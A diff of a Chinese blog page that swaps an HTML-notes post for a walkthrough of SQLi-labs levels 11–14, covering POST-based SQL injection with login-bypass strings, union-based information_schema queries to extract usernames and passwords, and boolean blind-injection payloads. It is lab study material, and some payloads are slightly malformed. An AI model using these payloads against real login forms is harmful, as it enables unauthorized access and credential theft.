@@ -20,27 +20,32 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="关于b站上的一些教程做的笔记Html: 超文本标记语言能加载CSS图片和JS样式Html元素解读HTMl元素&#96;&#96;&#96;&lt;img src&#x3D;””width&#x3D;””height&#x3D;””&#x2F;&gt;: 图像 &#96;&#96;&#96;&lt;a href&#x3D;&quot;&quot;&gt;: 链接 &#96;&#96;&#96;&lt;form&gt;: 表单 &#96;&#96;&#96;&lt;iframe&gt;: 内联框架">
+<meta name="description" content="less 11这关让我们输入账号密码，而不是简单的?id&#x3D;1，所以直接夹断.  代理抓包发现题与以往不同 以往采用的是get方法，而这里是post方法，以至于我们在submit之无法看到输入的usename和password 但是本质上还是之前的报错注入，不过是基于post的提交方式  利用抓包得到的信息可知上传的data为：uname&#x3D;&amp;passwd&#x3D;&amp;submit&#x3D;%E6%8F">
 <meta property="og:type" content="article">
-<meta property="og:title" content="“关于HTML”">
-<meta property="og:url" content="http://example.com/2021/09/28/%E2%80%9C%E5%85%B3%E4%BA%8EHTML%E2%80%9D/index.html">
+<meta property="og:title" content="less11-14">
+<meta property="og:url" content="http://example.com/2021/11/06/less11/index.html">
 <meta property="og:site_name" content="wds">
-<meta property="og:description" content="关于b站上的一些教程做的笔记Html: 超文本标记语言能加载CSS图片和JS样式Html元素解读HTMl元素&#96;&#96;&#96;&lt;img src&#x3D;””width&#x3D;””height&#x3D;””&#x2F;&gt;: 图像 &#96;&#96;&#96;&lt;a href&#x3D;&quot;&quot;&gt;: 链接 &#96;&#96;&#96;&lt;form&gt;: 表单 &#96;&#96;&#96;&lt;iframe&gt;: 内联框架">
+<meta property="og:description" content="less 11这关让我们输入账号密码，而不是简单的?id&#x3D;1，所以直接夹断.  代理抓包发现题与以往不同 以往采用的是get方法，而这里是post方法，以至于我们在submit之无法看到输入的usename和password 但是本质上还是之前的报错注入，不过是基于post的提交方式  利用抓包得到的信息可知上传的data为：uname&#x3D;&amp;passwd&#x3D;&amp;submit&#x3D;%E6%8F">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2021-09-28T06:23:46.000Z">
-<meta property="article:modified_time" content="2021-10-25T15:44:19.030Z">
+<meta property="og:image" content="https://i.loli.net/2021/11/06/gwi27DpZWobJkRd.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/06/13BEjwb6MlFcCOD.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/07/wF5CMxKoJOG1NcV.png">
+<meta property="article:published_time" content="2021-11-06T03:00:03.000Z">
+<meta property="article:modified_time" content="2021-11-07T13:21:05.795Z">
 <meta property="article:author" content="发福的小菜狗">
+<meta property="article:tag" content="sql注入">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/11/06/gwi27DpZWobJkRd.png">
 
 
-<link rel="canonical" href="http://example.com/2021/09/28/%E2%80%9C%E5%85%B3%E4%BA%8EHTML%E2%80%9D/">
+<link rel="canonical" href="http://example.com/2021/11/06/less11/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/09/28/%E2%80%9C%E5%85%B3%E4%BA%8EHTML%E2%80%9D/","path":"2021/09/28/“关于HTML”/","title":"“关于HTML”"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2021/11/06/less11/","path":"2021/11/06/less11/","title":"less11-14"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>“关于HTML” | wds</title>
+<title>less11-14 | wds</title>
   
 
 
@@ -119,7 +124,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%B3%E4%BA%8Eb%E7%AB%99%E4%B8%8A%E7%9A%84%E4%B8%80%E4%BA%9B%E6%95%99%E7%A8%8B%E5%81%9A%E7%9A%84%E7%AC%94%E8%AE%B0"><span class="nav-number">1.</span> <span class="nav-text">关于b站上的一些教程做的笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Html-%E8%B6%85%E6%96%87%E6%9C%AC%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80%E8%83%BD%E5%8A%A0%E8%BD%BDCSS%E5%9B%BE%E7%89%87%E5%92%8CJS%E6%A0%B7%E5%BC%8F"><span class="nav-number">1.1.</span> <span class="nav-text">Html: 超文本标记语言能加载CSS图片和JS样式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Html%E5%85%83%E7%B4%A0%E8%A7%A3%E8%AF%BB"><span class="nav-number">1.2.</span> <span class="nav-text">Html元素解读</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTMl%E5%85%83%E7%B4%A0"><span class="nav-number">1.2.1.</span> <span class="nav-text">HTMl元素</span></a></li></ol></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#less-11"><span class="nav-number">1.</span> <span class="nav-text">less 11</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-12"><span class="nav-number">2.</span> <span class="nav-text">less 12</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less13"><span class="nav-number">3.</span> <span class="nav-text">less13</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -182,7 +187,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/28/%E2%80%9C%E5%85%B3%E4%BA%8EHTML%E2%80%9D/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/06/less11/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -195,7 +200,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          “关于HTML”
+          less11-14
         </h1>
 
         <div class="post-meta-container">
@@ -206,14 +211,14 @@
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2021-09-28 14:23:46" itemprop="dateCreated datePublished" datetime="2021-09-28T14:23:46+08:00">2021-09-28</time>
+      <time title="Created: 2021-11-06 11:00:03" itemprop="dateCreated datePublished" datetime="2021-11-06T11:00:03+08:00">2021-11-06</time>
     </span>
       <span class="post-meta-item">
         <span class="post-meta-item-icon">
           <i class="far fa-calendar-check"></i>
         </span>
         <span class="post-meta-item-text">Edited on</span>
-        <time title="Modified: 2021-10-25 23:44:19" itemprop="dateModified" datetime="2021-10-25T23:44:19+08:00">2021-10-25</time>
+        <time title="Modified: 2021-11-07 21:21:05" itemprop="dateModified" datetime="2021-11-07T21:21:05+08:00">2021-11-07</time>
       </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -221,7 +226,7 @@
       </span>
       <span class="post-meta-item-text">In</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/web%E5%B8%B8%E8%AF%86/" itemprop="url" rel="index"><span itemprop="name">web常识</span></a>
+          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
         </span>
     </span>
 
@@ -235,11 +240,38 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="关于b站上的一些教程做的笔记"><a href="#关于b站上的一些教程做的笔记" class="headerlink" title="关于b站上的一些教程做的笔记"></a>关于b站上的一些<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1S7411e79V?p=3">教程</a>做的笔记</h1><h2 id="Html-超文本标记语言能加载CSS图片和JS样式"><a href="#Html-超文本标记语言能加载CSS图片和JS样式" class="headerlink" title="Html: 超文本标记语言能加载CSS图片和JS样式"></a>Html: 超文本标记语言能加载CSS图片和JS样式</h2><h2 id="Html元素解读"><a href="#Html元素解读" class="headerlink" title="Html元素解读"></a>Html元素解读</h2><h3 id="HTMl元素"><a href="#HTMl元素" class="headerlink" title="HTMl元素"></a>HTMl元素</h3><pre><code class="&lt;!--">```&lt;img src=””width=””height=””/&gt;: 图像
-```&lt;a href=&quot;&quot;&gt;: 链接
-```&lt;form&gt;: 表单
-```&lt;iframe&gt;: 内联框架
-</code></pre>
+        <h1 id="less-11"><a href="#less-11" class="headerlink" title="less 11"></a>less 11</h1><p>这关让我们输入账号密码，而不是简单的?id=1，所以直接夹断.</p>
+<p><img src="https://i.loli.net/2021/11/06/gwi27DpZWobJkRd.png" alt="QQ截图20211106114439.png"></p>
+<p>代理抓包发现题与以往不同</p>
+<p>以往采用的是get方法，而这里是post方法，以至于我们在submit之无法看到输入的usename和password</p>
+<p>但是本质上还是之前的报错注入，不过是基于post的提交方式</p>
+<p><img src="https://i.loli.net/2021/11/06/13BEjwb6MlFcCOD.png" alt="QQ截图20211106115325.png"></p>
+<p>利用抓包得到的信息可知上传的data为：uname=&amp;passwd=&amp;submit=%E6%8F%90%E4%BA%A4</p>
+<p>所以基于此，进行报错注入</p>
+<p>首先我们不知道账号密码，利用注释符和 or 1=1使其为真</p>
+<p>uname=n‘ or 1=1 #&amp;passwd=&amp;submit=%E6%8F%90%E4%BA%A4</p>
+<p>这样无论账号存不存在都可以登入（猜的）</p>
+<p>事实也是这样，这里返回了账号密码和我们输入的不一样，但是我们知道我们成功登入了，注释符以前的內容是可执行的这样接下来就是类似less1的内容</p>
+<p>order by n 查看列数</p>
+<p>union select 1，2，。。n查看回显</p>
+<p>按照回显来嵌套</p>
+<p>select database();</p>
+<p>select schema_name from information_schema.schemata;</p>
+<p>select table_name from information_schema.tables where table_schema=’A’;</p>
+<p>select column_name from information_schema.column where table_name=’B’;</p>
+<p>select username,password from where A.B;</p>
+<p>利用group_concat()和concat_ws()来简便操作</p>
+<p><img src="https://i.loli.net/2021/11/07/wF5CMxKoJOG1NcV.png" alt="QQ截图20211107111426.png"></p>
+<h1 id="less-12"><a href="#less-12" class="headerlink" title="less 12"></a>less 12</h1><p>同理同法，不过是把单引号改为双引号单括号。</p>
+<p>测试注入可以依次测试’  ,  ‘)  ,  ‘))  ,  “  ,  “)  ,  “))六种</p>
+<h1 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h1><p>同样操作</p>
+<p>post data：uname=1’) or 1=1#&amp;passwd=1&amp;submit=Submit</p>
+<p>这次没有报错，但也没有回显</p>
+<p>post data：uname=1’) or length(database()&gt;1#&amp;passwd=1&amp;submit=Submit来判断数据库名长度</p>
+<p>post data：uname=1’) or left（（select schema_name from information_schema.schemata limit 0,1）,1）=’a’#&amp;passwd=1&amp;submit=Submit来判断列名</p>
+<p>PS：or左右两边其中一边为真都为真，已知左为假，所以只有有报错则右边为假就会报错，所以利用此来破解库名，表名，列名。</p>
+<p>利用工具进行爆破详见less5,6总结</p>
+<p>less14也是同理</p>
 
     </div>
 
@@ -248,19 +280,19 @@
     
 
     <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
+          </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2021/09/26/%E2%80%9C%E5%86%B7%E7%9F%A5%E8%AF%86%E2%80%9D/" rel="prev" title="“冷知识”">
-                  <i class="fa fa-chevron-left"></i> “冷知识”
+                <a href="/2021/11/04/less7-8/" rel="prev" title="less7-10">
+                  <i class="fa fa-chevron-left"></i> less7-10
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2021/10/01/Markdown%E5%AD%A6%E4%B9%A0/" rel="next" title="markdown学习">
-                  markdown学习 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
